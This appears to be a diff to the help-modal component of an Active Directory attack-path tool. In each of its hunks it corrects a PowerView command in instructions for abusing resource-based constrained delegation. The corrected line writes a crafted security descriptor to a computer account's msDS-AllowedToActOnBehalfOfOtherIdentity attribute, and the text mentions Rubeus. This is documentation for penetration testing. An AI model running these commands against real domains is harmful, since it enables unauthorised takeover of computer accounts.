@@ -332,7 +332,7 @@ export default class HelpModal extends Component {
                     
                     Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
                     
-                    <code>$RawBytes = Get-DomainComputer "TARGETCOMPUTER" -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity</code>
+                    <code>Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code>
                     
                     We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                     
@@ -362,7 +362,7 @@ export default class HelpModal extends Component {
                     
                     Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
                     
-                    <code>$RawBytes = Get-DomainComputer "TARGETCOMPUTER" -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity</code>
+                    <code>Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code>
                     
                     We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                     
@@ -440,7 +440,7 @@ export default class HelpModal extends Component {
                     
                     Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
                     
-                    <code>$RawBytes = Get-DomainComputer "TARGETCOMPUTER" -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity</code>
+                    <code>Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code>
                     
                     We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                     
@@ -573,7 +573,7 @@ export default class HelpModal extends Component {
                     
                     Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
                     
-                    <code>$RawBytes = Get-DomainComputer "TARGETCOMPUTER" -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity</code>
+                    <code>Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code>
                     
                     We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                     
@@ -618,7 +618,7 @@ export default class HelpModal extends Component {
                     
                     Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
                     
-                    <code>$RawBytes = Get-DomainComputer "TARGETCOMPUTER" -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity</code>
+                    <code>Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code>
                     
                     We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                     
@@ -791,7 +791,7 @@ export default class HelpModal extends Component {
                     
                     Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
                     
-                    <code>$RawBytes = Get-DomainComputer "TARGETCOMPUTER" -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity</code>
+                    <code>Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code>
                     
                     We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                     
@@ -836,7 +836,7 @@ export default class HelpModal extends Component {
                     
                     Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
                     
-                    <code>$RawBytes = Get-DomainComputer "TARGETCOMPUTER" -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity</code>
+                    <code>Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code>
                     
                     We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                     
@@ -1047,7 +1047,7 @@ export default class HelpModal extends Component {
                     
                     Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
                     
-                    <code>$RawBytes = Get-DomainComputer "TARGETCOMPUTER" -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity</code>
+                    <code>Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code>
                     
                     We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                     
@@ -1107,7 +1107,7 @@ export default class HelpModal extends Component {
                     
                     Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
                     
-                    <code>$RawBytes = Get-DomainComputer "TARGETCOMPUTER" -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity</code>
+                    <code>Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code>
                     
                     We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
                     
@@ -1286,7 +1286,7 @@ export default class HelpModal extends Component {
             
             Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the comptuer account we're taking over, again using PowerView in this case:
             
-            <code>$RawBytes = Get-DomainComputer "TARGETCOMPUTER" -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity</code>
+            <code>Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}</code>
             
             We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:
             
